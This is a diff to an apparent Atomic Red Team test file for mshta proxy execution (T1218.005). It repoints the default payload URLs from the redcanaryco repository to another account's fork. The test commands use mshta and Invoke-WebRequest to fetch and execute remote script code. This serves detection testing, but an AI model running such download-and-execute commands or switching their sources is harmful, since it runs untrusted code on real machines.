@@ -11,7 +11,7 @@ atomic_tests:
     file_url:
       description: location of the payload
       type: Url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct
+      default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1218.005/src/mshta.sct
   executor:
     command: |
       mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
@@ -42,7 +42,7 @@ atomic_tests:
     hta_url:
       description: URL to HTA file for execution
       type: string
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta
+      default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta
   executor:
     command: |
       $var =Invoke-WebRequest "#{hta_url}"
